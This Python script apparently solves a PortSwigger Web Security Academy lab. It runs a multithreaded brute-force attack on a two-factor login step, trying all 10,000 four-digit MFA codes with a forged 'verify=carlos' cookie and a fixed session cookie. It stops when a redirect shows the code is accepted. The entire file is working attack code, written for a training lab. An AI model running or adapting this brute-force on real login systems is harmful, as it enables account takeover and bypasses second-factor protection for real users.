import concurrent.futures
import requests
import sys
import threading

url = 'https://0ab200ab0315479680db5da700a500b1.web-security-academy.net/login2'
sess = "PHBeTtRuI02pNNGXWLvss2MeF0dz3r5K"
found = threading.Event()
print_lock = threading.Lock()

def worker(code):
    if found.is_set():
        return
    session = requests.Session()
    response = session.post(url, cookies={"verify":"carlos", "session":sess}, data={"mfa-code":code}, allow_redirects=False)
    with print_lock:
        print(code+' | '+str(response.status_code))
    if response.status_code == 302:
        found.set()
        with print_lock:
            print('---')
            print("Done: " + code)
        return


with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
    for number1 in range(10):
        for number2 in range(10):
            for number3 in range(10):
                for number4 in range(10):
                    code = str(number1) + str(number2) + str(number3) + str(number4)
                    executor.submit(worker, code)
